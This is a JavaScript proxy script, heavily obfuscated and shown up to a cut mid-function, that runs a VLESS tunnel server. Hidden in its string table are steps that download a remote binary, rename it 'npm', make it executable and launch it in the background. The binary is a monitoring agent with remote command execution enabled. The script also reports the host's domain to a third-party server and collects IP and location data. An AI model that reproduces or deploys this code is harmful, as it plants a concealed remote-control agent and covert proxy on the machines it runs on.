const _0x57fced=_0x2a6d;(function(_0x12709d,_0x47c013){const _0x166013=_0x2a6d,_0x24e980=_0x12709d();while(!![]){try{const _0x5619fe=parseInt(_0x166013(0x1cf))/0x1+parseInt(_0x166013(0x153))/0x2+parseInt(_0x166013(0x17a))/0x3+parseInt(_0x166013(0x1e2))/0x4+-parseInt(_0x166013(0x149))/0x5*(parseInt(_0x166013(0x186))/0x6)+parseInt(_0x166013(0x11c))/0x7+-parseInt(_0x166013(0x1b7))/0x8*(parseInt(_0x166013(0x120))/0x9);if(_0x5619fe===_0x47c013)break;else _0x24e980['push'](_0x24e980['shift']());}catch(_0x261d4d){_0x24e980['push'](_0x24e980['shift']());}}}(_0x5aa4,0x9b08d));const os=require('os'),fs=require('fs'),net=require('net'),http=require(_0x57fced(0x12e)),axios=require('axios'),path=require('path'),{Buffer}=require('buffer'),{exec,execSync}=require(_0x57fced(0x1b3)),UUID=process[_0x57fced(0x101)][_0x57fced(0x189)]||_0x57fced(0x1b2),NEZHA_SERVER=process[_0x57fced(0x101)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x57fced(0x101)]['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x57fced(0x161)]||'',AUTO_ACCESS=process[_0x57fced(0x101)]['AUTO_ACCESS']||![],XPATH=process[_0x57fced(0x101)][_0x57fced(0x160)]||UUID[_0x57fced(0x154)](0x0,0x8),SUB_PATH=process[_0x57fced(0x101)][_0x57fced(0x12c)]||''+UUID,DOMAIN=process['env'][_0x57fced(0x122)]||'',NAME=process[_0x57fced(0x101)][_0x57fced(0x137)]||'Hug',PORT=process[_0x57fced(0x101)][_0x57fced(0x140)]||0x1eb4,SETTINGS={[_0x57fced(0x189)]:UUID,[_0x57fced(0x1bf)]:_0x57fced(0x150),['BUFFER_SIZE']:_0x57fced(0x135),[_0x57fced(0x160)]:_0x57fced(0x19e)+XPATH,['MAX_BUFFERED_POSTS']:0x1e,[_0x57fced(0x198)]:0xf4240,[_0x57fced(0x13b)]:0x7530,[_0x57fced(0x1e5)]:0x400*0x400,[_0x57fced(0x16b)]:!![],[_0x57fced(0x176)]:!![]};function validate_uuid(_0x12c9e0,_0x504289){for(let _0xb7490e=0x0;_0xb7490e<0x10;_0xb7490e++){if(_0x12c9e0[_0xb7490e]!==_0x504289[_0xb7490e])return![];}return!![];}function concat_typed_arrays(_0x426f52,..._0x471acc){const _0x5bcd4f=_0x57fced;if(!_0x471acc||_0x471acc[_0x5bcd4f(0x14d)]<0x1)return _0x426f52;let _0x4470d7=_0x426f52['length'];for(let _0x294288 of _0x471acc)_0x4470d7+=_0x294288[_0x5bcd4f(0x14d)];const _0x596134=new _0x426f52[(_0x5bcd4f(0x126))](_0x4470d7);_0x596134[_0x5bcd4f(0x111)](_0x426f52,0x0),_0x4470d7=_0x426f52['length'];for(let _0x587884 of _0x471acc){_0x596134['set'](_0x587884,_0x4470d7),_0x4470d7+=_0x587884[_0x5bcd4f(0x14d)];}return _0x596134;}function _0x5aa4(){const _0x3b6992=['2083','headersTimeout','https://amd64.ssss.nyc.mn/agent','listen','Error\x20starting\x20downstream:\x20','done','headerSent','1007064rvrhgH','Internal\x20Server\x20Error','VLESS\x20header\x20parsed:\x20','processPacket','aarch64','VLESS\x20header\x20parse\x20error:\x20','MAX_BUFFERED_POSTS','error','npm\x20is\x20running','chunked','destroyed','Created\x20new\x20session\x20for\x20GET:\x20','socket','initialized','hostname','writable','data','2087','keepAliveTimeout','3958468jylsEc','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','base64','CHUNK_SIZE','Automatic\x20Access\x20Task\x20added\x20successfully:','port','write','_writeToRemote','Socket\x20is\x20destroyed','vlessHeader','env','uuid','text/plain','Created\x20new\x20session\x20for\x20POST:\x20','forEach','join','info','Failed\x20to\x20write\x20to\x20remote:\x20','timeout','parse\x20hostname\x20failed','read\x20address\x20type\x20failed','concat','Failed\x20to\x20get\x20IP\x20address:','Cleaning\x20up\x20session\x20','invalid\x20UUID','Failed\x20to\x20parse\x20hostname','set','text/html','&path=','config.yaml','curl\x20-X\x20POST\x20\x22https://oooo.serv00.net/add-url\x22\x20-H\x20\x22Content-Type:\x20application/json\x22\x20-d\x20\x27{\x22url\x22:\x20\x22','read','reset','toString','toISOString','connect','getReader','1263612sPWryp','bufferedData','npm','method','18zEQYES','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','DOMAIN','writeHead','Server\x20error:\x20','nextSeq','constructor','Received\x20out\x20of\x20order\x20packet\x20seq=','GET','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','close','connect\x20timeout','SUB_PATH','Transform','http','from','nohup\x20./npm\x20-s\x20','get','readFile','createConnection','nextTick','2048','unlink','NAME','Read\x20controller\x20close\x20error:','cleanup','message','SESSION_TIMEOUT','warn','\x1b[32m','resp','finally','PORT','substr','match','http/1.1','stream','Upload\x20error:\x20','value','initializeVLESS','destroy','25hUnAxr','vless://','catch','push','length','\x20timed\x20out\x20without\x20downstream','Transfer-Encoding','none','VLESS\x20header\x20parsed\x20successfully','Buffered\x20packet\x20seq=','2005536MioeCV','slice','\x20before\x20initialization','downstreamStarted','Socket\x20error:','curl\x20-s\x20--max-time\x201\x20ipv6.ip.sb','\x22}\x27','Failed\x20to\x20initialize\x20VLESS:\x20','Sending\x20VLESS\x20response\x20header\x20(','now','read\x20vless\x20header\x20error:\x20','nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','alpnProtocol','XPATH','NEZHA_KEY','arm64','curl\x20-s\x20--max-time\x202\x20ipv4.ip.sb','trim','arm','Remote\x20connection\x20not\x20available','url','utf-8','lastActivity','Server\x20is\x20running\x20on\x20port\x20','TCP_NODELAY','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','&mode=packet-up#','2053','end','application/octet-stream','no-store','uncork','includes','Failed\x20to\x20start\x20downstream\x20for\x20session:\x20','BUFFER_SIZE','TCP_KEEPALIVE','\x1b[36m','readable','createWriteStream','2718249JyQUFM','setKeepAlive','remote','8443','localhost','Error\x20sending\x20request:','reading_done','pendingBuffers','npm\x20running\x20error:\x20','Relay\x20error:','Failed\x20to\x20process\x20POST\x20request:\x20','2096','1448394nUaRfy','split','startDownstream','UUID','--tls','reduce','Cleanup\x20error:\x20','debug','utf8','enqueue','POST','log','443','Processing\x20packet:\x20seq=','Session\x20',',\x20size=','header\x20length\x20too\x20short',':443?encryption=none&security=tls&sni=','MAX_POST_SIZE','Starting\x20to\x20parse\x20VLESS\x20header','getWriter','\x1b[33m','&fp=chrome&allowInsecure=1&type=xhttp&host=','cleaned','%2F','Content-Type','releaseLock','writableEnded','delete','finish','Download\x20error:\x20','https://arm64.ssss.nyc.mn/v1','New\x20secure\x20connection\x20using:\x20','https://arm64.ssss.nyc.mn/agent','createServer','true','floor','fill',']\x20[','https://amd64.ssss.nyc.mn/v1','size','writeFileSync','npm\x20download\x20successfully','Connection\x20failed:\x20','79bff246-6d5b-433a-ac80-d3c81016ac53','child_process','pause','decode','\x20>/dev/null\x202>&1\x20&','8976128wTPzOh','responseHeader','_startDownstreamResponse','VLESS\x20connection\x20to\x20','Remote\x20error:\x20','Too\x20many\x20buffered\x20packets','Remote\x20connection\x20established','has','LOG_LEVEL','currentStreamRes','Connected\x20to\x20','Initializing\x20VLESS\x20connection\x20from\x20first\x20packet','\x20-p\x20','index.html','pipe','chmod\x20+x\x20npm','aborted'];_0x5aa4=function(){return _0x3b6992;};return _0x5aa4();}function log(_0x31c81c,..._0x2f6b9e){const _0xc728f8=_0x57fced;if(SETTINGS[_0xc728f8(0x1bf)]==='none')return;const _0x3738c2={'debug':0x0,'info':0x1,'warn':0x2,'error':0x3},_0x26450b={'debug':_0xc728f8(0x177),'info':_0xc728f8(0x13d),'warn':_0xc728f8(0x19b),'error':'\x1b[31m','reset':'\x1b[0m'},_0x315f22=_0x3738c2[SETTINGS[_0xc728f8(0x1bf)]]||0x1,_0x3cc8d8=_0x3738c2[_0x31c81c]||0x0;if(_0x3cc8d8>=_0x315f22){const _0x1de789=new Date()[_0xc728f8(0x119)](),_0x1ab438=_0x26450b[_0x31c81c]||_0x26450b[_0xc728f8(0x117)];console[_0xc728f8(0x191)](_0x1ab438+'['+_0x1de789+_0xc728f8(0x1ac)+_0x31c81c+']',..._0x2f6b9e,_0x26450b[_0xc728f8(0x117)]);}}const getDownloadUrl=()=>{const _0x61cdfe=_0x57fced,_0x53efd7=os['arch']();return _0x53efd7===_0x61cdfe(0x165)||_0x53efd7===_0x61cdfe(0x162)||_0x53efd7===_0x61cdfe(0x1d3)?!NEZHA_PORT?_0x61cdfe(0x1a5):_0x61cdfe(0x1a7):!NEZHA_PORT?_0x61cdfe(0x1ad):_0x61cdfe(0x1ca);},downloadFile=async()=>{const _0x22be21=_0x57fced;if(!NEZHA_KEY)return;try{const _0x419925=getDownloadUrl(),_0x2cd9a2=await axios({'method':'get','url':_0x419925,'responseType':_0x22be21(0x144)}),_0x5911cf=fs[_0x22be21(0x179)](_0x22be21(0x11e));return _0x2cd9a2[_0x22be21(0x1df)][_0x22be21(0x1c5)](_0x5911cf),new Promise((_0x58f784,_0x1e446f)=>{const _0x21a32c=_0x22be21;_0x5911cf['on'](_0x21a32c(0x1a3),()=>{const _0x4fa737=_0x21a32c;console['log'](_0x4fa737(0x1b0)),exec(_0x4fa737(0x1c6),_0xc1c58a=>{if(_0xc1c58a)_0x1e446f(_0xc1c58a);_0x58f784();});}),_0x5911cf['on'](_0x21a32c(0x1d6),_0x1e446f);});}catch(_0x42b17b){throw _0x42b17b;}},runnz=async()=>{const _0x157e51=_0x57fced;await downloadFile();let _0x2d83a4='',_0xfa5b16='';if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0xc2e932=[_0x157e51(0x192),_0x157e51(0x17d),_0x157e51(0x185),'2087',_0x157e51(0x1c8),_0x157e51(0x16e)];_0x2d83a4=_0xc2e932[_0x157e51(0x173)](NEZHA_PORT)?_0x157e51(0x18a):'',_0xfa5b16=_0x157e51(0x130)+NEZHA_SERVER+':'+NEZHA_PORT+_0x157e51(0x1c3)+NEZHA_KEY+'\x20'+_0x2d83a4+_0x157e51(0x1b6);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2be36b=NEZHA_SERVER[_0x157e51(0x173)](':')?NEZHA_SERVER[_0x157e51(0x187)](':')['pop']():'',_0x262cb7=new Set([_0x157e51(0x192),_0x157e51(0x17d),_0x157e51(0x185),_0x157e51(0x1e0),'2083',_0x157e51(0x16e)]),_0x246662=_0x262cb7[_0x157e51(0x1be)](_0x2be36b)?_0x157e51(0x1a9):'false',_0x5604e7='\x0aclient_secret:\x20'+NEZHA_KEY+_0x157e51(0x1e3)+NEZHA_SERVER+_0x157e51(0x121)+_0x246662+_0x157e51(0x16c)+UUID;fs[_0x157e51(0x1af)](_0x157e51(0x114),_0x5604e7);}_0xfa5b16=_0x157e51(0x15e);}else return;}try{exec(_0xfa5b16,{'shell':'/bin/bash'}),console[_0x157e51(0x191)](_0x157e51(0x1d7));}catch(_0x85be71){console[_0x157e51(0x1d6)](_0x157e51(0x182)+_0x85be71);}};async function addAccessTask(){const _0x3a53b6=_0x57fced;if(AUTO_ACCESS!==!![])return;try{if(!DOMAIN)return;const _0x4edc83='https://'+DOMAIN,_0xfec17d=_0x3a53b6(0x115)+_0x4edc83+_0x3a53b6(0x159);exec(_0xfec17d,(_0x3f01fb,_0x28d7b3,_0xe770f7)=>{const _0x124133=_0x3a53b6;if(_0x3f01fb){console[_0x124133(0x1d6)](_0x124133(0x17f),_0x3f01fb[_0x124133(0x13a)]);return;}console[_0x124133(0x191)](_0x124133(0x1e6),_0x28d7b3);});}catch(_0x1c6c51){console['error']('Error\x20added\x20Task:',_0x1c6c51[_0x3a53b6(0x13a)]);}}function parse_uuid(_0x2d5f62){const _0x4193a8=_0x57fced;_0x2d5f62=_0x2d5f62['replaceAll']('-','');const _0x22d4bf=[];for(let _0x42bb93=0x0;_0x42bb93<0x10;_0x42bb93++){_0x22d4bf[_0x4193a8(0x14c)](parseInt(_0x2d5f62[_0x4193a8(0x141)](_0x42bb93*0x2,0x2),0x10));}return _0x22d4bf;}async function read_vless_header(_0x31f692,_0x1c97dd){const _0x5bb1df=_0x57fced;let _0x4b8ac1=0x0,_0x2d7f69=new Uint8Array(),_0x13e0d3={'value':_0x2d7f69,'done':![]};async function _0x2d1d78(_0x4e04f4){const _0x1af0da=_0x2a6d;if(_0x13e0d3[_0x1af0da(0x1cd)])throw new Error(_0x1af0da(0x196));const _0x1297a5=_0x4e04f4-_0x4b8ac1;if(_0x1297a5<0x1)return;_0x13e0d3=await read_atleast(_0x31f692,_0x1297a5),_0x4b8ac1+=_0x13e0d3[_0x1af0da(0x146)][_0x1af0da(0x14d)],_0x2d7f69=concat_typed_arrays(_0x2d7f69,_0x13e0d3[_0x1af0da(0x146)]);}await _0x2d1d78(0x1+0x10+0x1);const _0x80e852=_0x2d7f69[0x0],_0x1385f1=_0x2d7f69[_0x5bb1df(0x154)](0x1,0x1+0x10),_0x7779ba=parse_uuid(_0x1c97dd);if(!validate_uuid(_0x1385f1,_0x7779ba))throw new Error(_0x5bb1df(0x10f));const _0xf65e3d=_0x2d7f69[0x1+0x10],_0x2ba738=0x1+0x10+0x1+_0xf65e3d+0x1+0x2+0x1;await _0x2d1d78(_0x2ba738+0x1);const _0x32a359=_0x2d7f69[0x1+0x10+0x1+_0xf65e3d],_0x3c7fd4=0x1;if(_0x32a359!==_0x3c7fd4)throw new Error('unsupported\x20command:\x20'+_0x32a359);const _0x1a4e6b=(_0x2d7f69[_0x2ba738-0x1-0x2]<<0x8)+_0x2d7f69[_0x2ba738-0x1-0x1],_0xdaa4a1=_0x2d7f69[_0x2ba738-0x1],_0x352682=0x1,_0x2cdb91=0x2,_0x4aff70=0x3;let _0x56039f=-0x1;if(_0xdaa4a1===_0x352682)_0x56039f=_0x2ba738+0x4;else{if(_0xdaa4a1===_0x4aff70)_0x56039f=_0x2ba738+0x10;else _0xdaa4a1===_0x2cdb91&&(_0x56039f=_0x2ba738+0x1+_0x2d7f69[_0x2ba738]);}if(_0x56039f<0x0)throw new Error(_0x5bb1df(0x10b));await _0x2d1d78(_0x56039f);const _0x2c6aac=_0x2ba738;let _0x16f37a='';if(_0xdaa4a1===_0x352682)_0x16f37a=_0x2d7f69[_0x5bb1df(0x154)](_0x2c6aac,_0x2c6aac+0x4)[_0x5bb1df(0x106)]('.');else{if(_0xdaa4a1===_0x2cdb91)_0x16f37a=new TextDecoder()[_0x5bb1df(0x1b5)](_0x2d7f69[_0x5bb1df(0x154)](_0x2c6aac+0x1,_0x2c6aac+0x1+_0x2d7f69[_0x2c6aac]));else _0xdaa4a1===_0x4aff70&&(_0x16f37a=_0x2d7f69[_0x5bb1df(0x154)](_0x2c6aac,_0x2c6aac+0x10)[_0x5bb1df(0x18b)]((_0x4acfc0,_0x506473,_0x52c170,_0x4e88be)=>_0x52c170%0x2?_0x4acfc0[_0x5bb1df(0x10c)](((_0x4e88be[_0x52c170-0x1]<<0x8)+_0x506473)[_0x5bb1df(0x118)](0x10)):_0x4acfc0,[])[_0x5bb1df(0x106)](':'));}if(!_0x16f37a){log(_0x5bb1df(0x1d6),_0x5bb1df(0x110));throw new Error(_0x5bb1df(0x10a));}return log(_0x5bb1df(0x107),_0x5bb1df(0x1ba)+_0x16f37a+':'+_0x1a4e6b),{'hostname':_0x16f37a,'port':_0x1a4e6b,'data':_0x2d7f69[_0x5bb1df(0x154)](_0x56039f),'resp':new Uint8Array([_0x80e852,0x0])};}function _0x2a6d(_0x4c1d5d,_0x4c28c7){const _0x5aa4b6=_0x5aa4();return _0x2a6d=function(_0x2a6de8,_0x207b42){_0x2a6de8=_0x2a6de8-0xfe;let _0x3d1b9c=_0x5aa4b6[_0x2a6de8];return _0x3d1b9c;},_0x2a6d(_0x4c1d5d,_0x4c28c7);}async function read_atleast(_0x329ef,_0x223198){const _0x243bc1=_0x57fced,_0x24009b=[];let _0x2fce3d=![];while(_0x223198>0x0&&!_0x2fce3d){const _0x4120c6=await _0x329ef[_0x243bc1(0x116)]();if(_0x4120c6[_0x243bc1(0x146)]){const _0x266136=new Uint8Array(_0x4120c6[_0x243bc1(0x146)]);_0x24009b[_0x243bc1(0x14c)](_0x266136),_0x223198-=_0x266136[_0x243bc1(0x14d)];}_0x2fce3d=_0x4120c6[_0x243bc1(0x1cd)];}if(_0x223198>0x0)throw new Error('not\x20enough\x20data\x20to\x20read');return{'value':concat_typed_arrays(..._0x24009b),'done':_0x2fce3d};}async function parse_header(_0x5c469b,_0x7fcba5){const _0x1b4a25=_0x57fced;log(_0x1b4a25(0x18d),_0x1b4a25(0x199));const _0x4d35a3=_0x7fcba5[_0x1b4a25(0x178)][_0x1b4a25(0x11b)]();try{const _0x1b64e5=await read_vless_header(_0x4d35a3,_0x5c469b);return log('debug',_0x1b4a25(0x151)),_0x1b64e5;}catch(_0x34f072){log('error',_0x1b4a25(0x1d4)+_0x34f072[_0x1b4a25(0x13a)]);throw new Error(_0x1b4a25(0x15d)+_0x34f072[_0x1b4a25(0x13a)]);}finally{_0x4d35a3[_0x1b4a25(0x1a0)]();}}async function connect_remote(_0x3d51a2,_0x6bc25f){const _0x33e19a=_0x57fced,_0x2751ff=0x1f40;try{const _0x4c52d3=await timed_connect(_0x3d51a2,_0x6bc25f,_0x2751ff);return _0x4c52d3['setNoDelay'](!![]),_0x4c52d3[_0x33e19a(0x17b)](!![],0x3e8),_0x4c52d3['bufferSize']=parseInt(SETTINGS[_0x33e19a(0x175)])*0x400,log(_0x33e19a(0x107),_0x33e19a(0x1c1)+_0x3d51a2+':'+_0x6bc25f),_0x4c52d3;}catch(_0x209a3b){log(_0x33e19a(0x1d6),_0x33e19a(0x1b1)+_0x209a3b['message']);throw _0x209a3b;}}function timed_connect(_0xfbbbda,_0x396ee5,_0x1a690e){return new Promise((_0x13e1ff,_0xa08af9)=>{const _0x543b8c=_0x2a6d,_0x4ad91e=net[_0x543b8c(0x133)]({'host':_0xfbbbda,'port':_0x396ee5}),_0x56fe92=setTimeout(()=>{const _0x5996f3=_0x543b8c;_0xa08af9(new Error(_0x5996f3(0x12b)));},_0x1a690e);_0x4ad91e['on'](_0x543b8c(0x11a),()=>{clearTimeout(_0x56fe92),_0x13e1ff(_0x4ad91e);}),_0x4ad91e['on'](_0x543b8c(0x1d6),_0x1a4694=>{clearTimeout(_0x56fe92),_0xa08af9(_0x1a4694);});});}function pipe_relay(){async function _0x58879b(_0x22bc23,_0x91ffb3,_0xb727c9){const _0x27a138=_0x2a6d,_0x49d875=parseInt(SETTINGS[_0x27a138(0x1e5)]);if(_0xb727c9['length']>0x0){if(_0x91ffb3['write'])_0x91ffb3['cork'](),_0x91ffb3[_0x27a138(0x1e8)](_0xb727c9),process[_0x27a138(0x134)](()=>_0x91ffb3[_0x27a138(0x172)]());else{const _0x3d03cb=_0x91ffb3[_0x27a138(0x1de)][_0x27a138(0x19a)]();try{await _0x3d03cb['write'](_0xb727c9);}finally{_0x3d03cb['releaseLock']();}}}try{_0x22bc23[_0x27a138(0x1c5)]?(_0x22bc23[_0x27a138(0x1b4)](),_0x22bc23['pipe'](_0x91ffb3,{'end':!![],'highWaterMark':_0x49d875}),_0x22bc23['resume']()):await _0x22bc23[_0x27a138(0x178)]['pipeTo'](_0x91ffb3[_0x27a138(0x1de)],{'preventClose':![],'preventAbort':![],'preventCancel':![],'signal':AbortSignal[_0x27a138(0x109)](SETTINGS['SESSION_TIMEOUT'])});}catch(_0x3dcdac){!_0x3dcdac['message'][_0x27a138(0x173)](_0x27a138(0x1c7))&&log(_0x27a138(0x1d6),_0x27a138(0x183),_0x3dcdac['message']);throw _0x3dcdac;}}return _0x58879b;}function socketToWebStream(_0x1db5a7){const _0x2e350b=_0x57fced;let _0x1c3fa3,_0x1ab168;return _0x1db5a7['on'](_0x2e350b(0x1d6),_0x43d6ce=>{const _0x5e4dd3=_0x2e350b;log('error',_0x5e4dd3(0x157),_0x43d6ce[_0x5e4dd3(0x13a)]),_0x1c3fa3?.[_0x5e4dd3(0x1d6)](_0x43d6ce),_0x1ab168?.[_0x5e4dd3(0x1d6)](_0x43d6ce);}),{'readable':new ReadableStream({'start'(_0x5ceff7){const _0x527cfc=_0x2e350b;_0x1c3fa3=_0x5ceff7,_0x1db5a7['on'](_0x527cfc(0x1df),_0x4d0500=>{const _0x3062be=_0x527cfc;try{_0x5ceff7[_0x3062be(0x18f)](_0x4d0500);}catch(_0x3e1895){log(_0x3062be(0x1d6),'Read\x20controller\x20error:',_0x3e1895['message']);}}),_0x1db5a7['on']('end',()=>{const _0x3a65bb=_0x527cfc;try{_0x5ceff7['close']();}catch(_0x1a9ff6){log('error',_0x3a65bb(0x138),_0x1a9ff6[_0x3a65bb(0x13a)]);}});},'cancel'(){const _0x4989c9=_0x2e350b;_0x1db5a7[_0x4989c9(0x148)]();}}),'writable':new WritableStream({'start'(_0x50d749){_0x1ab168=_0x50d749;},'write'(_0x5715f2){return new Promise((_0x4561b4,_0x11b497)=>{const _0x2f47c3=_0x2a6d;if(_0x1db5a7[_0x2f47c3(0x1d9)]){_0x11b497(new Error(_0x2f47c3(0xff)));return;}_0x1db5a7[_0x2f47c3(0x1e8)](_0x5715f2,_0x50bd52=>{if(_0x50bd52)_0x11b497(_0x50bd52);else _0x4561b4();});});},'close'(){const _0xbbe64d=_0x2e350b;!_0x1db5a7[_0xbbe64d(0x1d9)]&&_0x1db5a7[_0xbbe64d(0x16f)]();},'abort'(_0x2fda6d){const _0x427b6b=_0x2e350b;_0x1db5a7[_0x427b6b(0x148)](_0x2fda6d);}})};}function relay(_0x1665a6,_0x19bc94,_0x575ca4,_0x3569ab){const _0xdeeb6=_0x57fced,_0x3fce4f=pipe_relay();let _0x3e29cc=![];const _0x4d72d4=socketToWebStream(_0x575ca4);function _0x533a9b(){const _0x4dad9d=_0x2a6d;if(!_0x3e29cc){_0x3e29cc=!![];try{_0x575ca4[_0x4dad9d(0x148)]();}catch(_0x15f0d7){!_0x15f0d7['message'][_0x4dad9d(0x173)](_0x4dad9d(0x1c7))&&!_0x15f0d7[_0x4dad9d(0x13a)][_0x4dad9d(0x173)]('socket\x20hang\x20up')&&log(_0x4dad9d(0x1d6),_0x4dad9d(0x18c)+_0x15f0d7[_0x4dad9d(0x13a)]);}}}const _0x55f5bd=_0x3fce4f(_0x19bc94,_0x4d72d4,_0x3569ab[_0xdeeb6(0x1df)])[_0xdeeb6(0x14b)](_0x1397e4=>{const _0x560ffa=_0xdeeb6;!_0x1397e4[_0x560ffa(0x13a)][_0x560ffa(0x173)]('aborted')&&!_0x1397e4['message']['includes']('socket\x20hang\x20up')&&log(_0x560ffa(0x1d6),_0x560ffa(0x145)+_0x1397e4[_0x560ffa(0x13a)]);})[_0xdeeb6(0x13f)](()=>{const _0x83230a=_0xdeeb6;_0x19bc94['reading_done']&&_0x19bc94[_0x83230a(0x180)]();}),_0x3ba762=_0x3fce4f(_0x4d72d4,_0x19bc94,_0x3569ab['resp'])[_0xdeeb6(0x14b)](_0x95eb4e=>{const _0x308e73=_0xdeeb6;!_0x95eb4e[_0x308e73(0x13a)][_0x308e73(0x173)]('aborted')&&!_0x95eb4e[_0x308e73(0x13a)][_0x308e73(0x173)]('socket\x20hang\x20up')&&log(_0x308e73(0x1d6),_0x308e73(0x1a4)+_0x95eb4e['message']);});_0x3ba762[_0xdeeb6(0x13f)](()=>_0x55f5bd)[_0xdeeb6(0x13f)](_0x533a9b);}const sessions=new Map();class Session{constructor(_0x162d05){const _0x21d56f=_0x57fced;this[_0x21d56f(0x102)]=_0x162d05,this['nextSeq']=0x0,this[_0x21d56f(0x156)]=![],this[_0x21d56f(0x169)]=Date[_0x21d56f(0x15c)](),this[_0x21d56f(0x100)]=null,this[_0x21d56f(0x17c)]=null,this[_0x21d56f(0x1dc)]=![],this[_0x21d56f(0x1b8)]=null,this[_0x21d56f(0x1ce)]=![],this[_0x21d56f(0x11d)]=new Map(),this[_0x21d56f(0x19d)]=![],this['pendingPackets']=[],this['currentStreamRes']=null,this[_0x21d56f(0x181)]=new Map(),log(_0x21d56f(0x18d),'Created\x20new\x20session\x20with\x20UUID:\x20'+_0x162d05);}async[_0x57fced(0x147)](_0x1be022){const _0x5d2679=_0x57fced;if(this[_0x5d2679(0x1dc)])return!![];try{log(_0x5d2679(0x18d),_0x5d2679(0x1c2));const _0x257f06=new ReadableStream({'start'(_0x2904ed){const _0xbd66da=_0x5d2679;_0x2904ed[_0xbd66da(0x18f)](_0x1be022),_0x2904ed[_0xbd66da(0x12a)]();}}),_0x3e3d3e={'readable':_0x257f06,'writable':new WritableStream()};return this[_0x5d2679(0x100)]=await parse_header(SETTINGS['UUID'],_0x3e3d3e),log(_0x5d2679(0x107),_0x5d2679(0x1d1)+this[_0x5d2679(0x100)][_0x5d2679(0x1dd)]+':'+this[_0x5d2679(0x100)]['port']),this[_0x5d2679(0x17c)]=await connect_remote(this[_0x5d2679(0x100)]['hostname'],this[_0x5d2679(0x100)][_0x5d2679(0x1e7)]),log(_0x5d2679(0x107),_0x5d2679(0x1bd)),this[_0x5d2679(0x1dc)]=!![],!![];}catch(_0x33d5ec){return log(_0x5d2679(0x1d6),_0x5d2679(0x15a)+_0x33d5ec[_0x5d2679(0x13a)]),![];}}async[_0x57fced(0x1d2)](_0x5e263b,_0x1e6221){const _0x53b4cd=_0x57fced;try{this[_0x53b4cd(0x181)][_0x53b4cd(0x111)](_0x5e263b,_0x1e6221),log('debug',_0x53b4cd(0x152)+_0x5e263b+_0x53b4cd(0x195)+_0x1e6221['length']);while(this[_0x53b4cd(0x181)]['has'](this[_0x53b4cd(0x125)])){const _0x295692=this[_0x53b4cd(0x181)]['get'](this['nextSeq']);this[_0x53b4cd(0x181)][_0x53b4cd(0x1a2)](this[_0x53b4cd(0x125)]);if(!this[_0x53b4cd(0x1dc)]&&this[_0x53b4cd(0x125)]===0x0){if(!await this[_0x53b4cd(0x147)](_0x295692))throw new Error('Failed\x20to\x20initialize\x20VLESS\x20connection');this[_0x53b4cd(0x1b8)]=Buffer['from'](this[_0x53b4cd(0x100)][_0x53b4cd(0x13e)]),await this[_0x53b4cd(0xfe)](this[_0x53b4cd(0x100)][_0x53b4cd(0x1df)]),this[_0x53b4cd(0x1c0)]&&this[_0x53b4cd(0x1b9)]();}else{if(!this[_0x53b4cd(0x1dc)]){log(_0x53b4cd(0x13c),_0x53b4cd(0x127)+_0x5e263b+_0x53b4cd(0x155));continue;}await this[_0x53b4cd(0xfe)](_0x295692);}this[_0x53b4cd(0x125)]++,log(_0x53b4cd(0x18d),'Processed\x20packet\x20seq='+(this[_0x53b4cd(0x125)]-0x1));}if(this['pendingBuffers'][_0x53b4cd(0x1ae)]>SETTINGS[_0x53b4cd(0x1d5)])throw new Error(_0x53b4cd(0x1bc));return!![];}catch(_0xf9fc6d){log(_0x53b4cd(0x1d6),'Process\x20packet\x20error:\x20'+_0xf9fc6d[_0x53b4cd(0x13a)]);throw _0xf9fc6d;}}[_0x57fced(0x1b9)](){const _0x13166b=_0x57fced;if(!this[_0x13166b(0x1c0)]||!this['responseHeader'])return;try{const _0x259acc=this['currentStreamRes'][_0x13166b(0x1db)]?.[_0x13166b(0x15f)]||_0x13166b(0x143),_0x253ef4=_0x259acc==='h2';!this[_0x13166b(0x1ce)]&&(log(_0x13166b(0x18d),_0x13166b(0x15b)+_0x259acc+'):\x20'+this[_0x13166b(0x1b8)]['length']+'\x20bytes'),this[_0x13166b(0x1c0)][_0x13166b(0x1e8)](this[_0x13166b(0x1b8)]),this['headerSent']=!![]);if(_0x253ef4){this[_0x13166b(0x1c0)][_0x13166b(0x1db)]['setNoDelay'](!![]);const _0x5e9489=new require(_0x13166b(0x144))[_0x13166b(0x12d)]({'transform'(_0x4348e1,_0x5b93bc,_0xaae9c8){const _0x229b8a=_0x13166b,_0x1ff265=0x4000;for(let _0xeb58ed=0x0;_0xeb58ed<_0x4348e1[_0x229b8a(0x14d)];_0xeb58ed+=_0x1ff265){this['push'](_0x4348e1[_0x229b8a(0x154)](_0xeb58ed,_0xeb58ed+_0x1ff265));}_0xaae9c8();}});this['remote'][_0x13166b(0x1c5)](_0x5e9489)[_0x13166b(0x1c5)](this[_0x13166b(0x1c0)]);}else this[_0x13166b(0x17c)][_0x13166b(0x1c5)](this[_0x13166b(0x1c0)]);this[_0x13166b(0x17c)]['on'](_0x13166b(0x16f),()=>{const _0x2f3a7c=_0x13166b;!this[_0x2f3a7c(0x1c0)]['writableEnded']&&this['currentStreamRes'][_0x2f3a7c(0x16f)]();}),this[_0x13166b(0x17c)]['on'](_0x13166b(0x1d6),_0x25d40e=>{const _0x498122=_0x13166b;log(_0x498122(0x1d6),_0x498122(0x1bb)+_0x25d40e[_0x498122(0x13a)]),!this[_0x498122(0x1c0)]['writableEnded']&&this[_0x498122(0x1c0)][_0x498122(0x16f)]();});}catch(_0x516a0c){log('error',_0x13166b(0x1cc)+_0x516a0c['message']),this[_0x13166b(0x139)]();}}[_0x57fced(0x188)](_0x58d881,_0x1fbc18){const 